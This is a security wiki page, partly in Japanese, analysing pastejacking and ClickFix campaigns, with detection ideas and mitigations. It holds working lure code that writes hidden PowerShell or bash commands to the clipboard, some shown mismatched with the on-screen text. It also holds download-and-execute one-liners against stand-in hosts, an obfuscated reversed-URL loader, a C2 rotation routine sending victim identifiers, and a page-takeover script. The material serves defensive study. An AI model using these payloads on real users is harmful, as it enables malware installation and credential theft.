# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> 「自分でコピーしていないものは決して貼り付けるな。」 – 古いが今も有効な助言

## 概要

Clipboard hijacking – also known as *pastejacking* – は、ユーザがコマンドを確認せずに日常的にコピー＆ペーストするという事実を悪用します。悪意あるウェブページ（または Electron やデスクトップアプリケーションなど JavaScript が動作する任意のコンテキスト）は、プログラムで攻撃者が制御するテキストをシステムクリップボードに置きます。被害者は通常、巧妙に作られたソーシャルエンジニアリングの指示により、**Win + R**（Run dialog）、**Win + X**（Quick Access / PowerShell）を押すかターミナルを開いてクリップボードの内容を*貼り付け*、即座に任意のコマンドが実行されます。

**ファイルはダウンロードされず、添付ファイルも開かれない**ため、この手法は添付ファイル、マクロ、または直接コマンド実行を監視するほとんどのメールおよびウェブコンテンツのセキュリティ制御を回避します。したがってこの攻撃は、NetSupport RAT、Latrodectus loader、Lumma Stealer のような汎用マルウェアファミリーを配布する phishing キャンペーンで広く用いられています。

## JavaScript の概念実証
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Older campaigns used `document.execCommand('copy')`, newer ones rely on the asynchronous **Clipboard API** (`navigator.clipboard.writeText`).

## ClickFix / ClearFake のフロー

1. ユーザーがタイポスクワットされた、または改ざんされたサイトにアクセスする（例: `docusign.sa[.]com`）
2. 注入された **ClearFake** JavaScript は `unsecuredCopyToClipboard()` ヘルパーを呼び出し、クリップボードに Base64 エンコードされた PowerShell のワンライナーを静かに格納します。
3. HTML の指示は被害者に次のように伝える: *「**Win + R** を押し、コマンドを貼り付けて Enter を押して問題を解決してください。」*
4. `powershell.exe` が実行され、正当な実行ファイルと悪意のある DLL を含むアーカイブをダウンロードします（典型的な DLL sideloading）。
5. ローダーは追加のステージを復号し、shellcode を注入し、永続化（例: scheduled task）をインストールします — 最終的に NetSupport RAT / Latrodectus / Lumma Stealer を実行します。

### NetSupport RAT のチェーン例
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (正規の Java WebStart) は、そのディレクトリ内で `msvcp140.dll` を検索します。
* 悪意のある DLL は **GetProcAddress** で API を動的に解決し、**curl.exe** を介して 2 つのバイナリ (`data_3.bin`, `data_4.bin`) をダウンロードし、ローリング XOR キー `"https://google.com/"` で復号し、最終的な shellcode をインジェクトして **client32.exe** (NetSupport RAT) を `C:\ProgramData\SecurityCheck_v1\` に解凍します。

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. `la.txt` を **curl.exe** でダウンロードする
2. **cscript.exe** 内で JScript downloader を実行する
3. MSI payload を取得 → 署名されたアプリケーションの隣に `libcef.dll` をドロップ → DLL sideloading → shellcode → Latrodectus.

### MSHTA 経由の Lumma Stealer
```
mshta https://iplogger.co/xxxx =+\\xxx
```
The **mshta** の呼び出しは隠し PowerShell スクリプトを起動し、`PartyContinued.exe` を取得、`Boat.pst`（CAB）を展開し、`extrac32` とファイル連結で `AutoIt3.exe` を再構築し、最終的に `.a3x` スクリプトを実行してブラウザの資格情報を `sumeriavgv.digital` に送信します。

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)

一部の ClickFix キャンペーンはファイルのダウンロードをまったく行わず、被害者に WSH 経由で JavaScript を取得して実行する one‑liner を貼り付けさせ、それを永続化し、C2 を日次で切り替えさせます。観測されたチェーンの例：
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
主な特徴
- 実行時に難読化された URL を反転して表面的な確認を回避する。
- JavaScript は Startup LNK (WScript/CScript) を介して自身を永続化し、当日の日付で C2 を選択する – これにより迅速なドメインローテーションが可能になる。

日付で C2s をローテーションするために使用される最小の JS フラグメント:
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
次の段階では、永続化を確立し RAT（例: PureHVNC）を取得する loader が展開されることが多く、しばしば TLS をハードコードされた証明書にピン留めし、トラフィックをチャンク化します。

Detection ideas specific to this variant
- Process tree: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (or `cscript.exe`).
- Startup artifacts: LNK in `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` invoking WScript/CScript with a JS path under `%TEMP%`/`%APPDATA%`.
- Registry/RunMRU and command‑line telemetry containing `.split('').reverse().join('')` or `eval(a.responseText)`.
- Repeated `powershell -NoProfile -NonInteractive -Command -` with large stdin payloads to feed long scripts without long command lines.
- Scheduled Tasks that subsequently execute LOLBins such as `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` under an updater‑looking task/path (e.g., `\GoogleSystem\GoogleUpdater`).

脅威ハンティング
- 日替わりで回る C2 ホスト名や URL で、パターンが `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>` のもの。
- クリップボード書き込みイベントに続けて Win+R の貼り付け、その直後に `powershell.exe` が実行される事象を相関させる。

Blueチームはクリップボード、プロセス作成、レジストリのテレメトリを組み合わせて pastejacking の濫用を特定できます:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` は **Win + R** コマンドの履歴を保持します — 異常な Base64 / 難読化されたエントリを探してください。
* Security Event ID **4688** (Process Creation) で `ParentImage` == `explorer.exe` かつ `NewProcessName` が { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` } に含まれるもの。
* Event ID **4663**：疑わしい 4688 イベントの直前に `%LocalAppData%\Microsoft\Windows\WinX\` や一時フォルダ下でのファイル作成があるか確認。
* EDR clipboard sensors（存在する場合） — `Clipboard Write` の直後に新しい PowerShell プロセスが起動しているかを相関させる。

## IUAM-style verification pages (ClickFix Generator): clipboard copy-to-console + OS-aware payloads

最近のキャンペーンでは、偽の CDN/ブラウザ検証ページ（"Just a moment…", IUAM-style）を大量生産し、ユーザーに OS 固有のコマンドをクリップボードからネイティブコンソールにコピーさせるよう強制する手口が見られます。これにより実行はブラウザサンドボックス外へとピボットし、Windows と macOS の両方で動作します。

ビルダー生成ページの主な特徴
- `navigator.userAgent` による OS 検出でペイロードを切り替える（Windows の PowerShell/CMD と macOS の Terminal）。対応外の OS にはデコイ/無操作を入れて演出を維持することがある。
- チェックボックスや Copy といった無害な UI 操作で自動的にクリップボードへコピーする一方、表示されているテキストはクリップボードの内容と異なる場合がある。
- モバイル端末をブロックし、ステップバイステップのポップオーバーを表示：Windows → Win+R→paste→Enter；macOS → Terminal を開く→paste→Enter。
- 任意で難読化や単一ファイルインジェクタを使い、侵害されたサイトの DOM を Tailwind スタイルの検証 UI で上書きする（新しいドメイン登録は不要）。

Example: clipboard mismatch + OS-aware branching
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
macOS persistence of the initial run
- `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` を使用すると、端末が閉じた後も実行が継続し、目に見える痕跡が減ります。

In-place page takeover on compromised sites
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
IUAM-style lures に特有の検知・ハンティングのアイデア
- Web: Clipboard API を verification widgets にバインドするページ；表示テキストと clipboard payload の不一致；`navigator.userAgent` による分岐；Tailwind + 疑わしいコンテキストでの single-page 置換。
- Windows エンドポイント: `explorer.exe` → `powershell.exe`/`cmd.exe` がブラウザ操作直後に発生；`%TEMP%` から実行される batch/MSI インストーラ。
- macOS エンドポイント: Terminal/iTerm がブラウザイベント付近で `bash`/`curl`/`base64 -d` と `nohup` を起動；ターミナル終了後も生存するバックグラウンドジョブ。
- `RunMRU` (Win+R) 履歴と clipboard 書き込みを、その後のコンソールプロセス生成と相関付ける。

See also for supporting techniques

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## 対策

1. Browser hardening – clipboard write-access を無効化（`dom.events.asyncClipboard.clipboardItem` など）またはユーザー操作を要求する。
2. Security awareness – ユーザーに機密コマンドを*入力する*、もしくは事前にテキストエディタに貼り付けて確認させるよう教育する。
3. PowerShell Constrained Language Mode / Execution Policy + Application Control による任意のワンライナーのブロック。
4. ネットワーク制御 – 既知の pastejacking や malware C2 ドメインへのアウトバウンドを遮断する。

## 関連トリック

* **Discord Invite Hijacking** は、ユーザーを悪意あるサーバーに誘導した後、同じ ClickFix アプローチを悪用することが多い：

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## References

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)

{{#include ../../banners/hacktricks-training.md}}
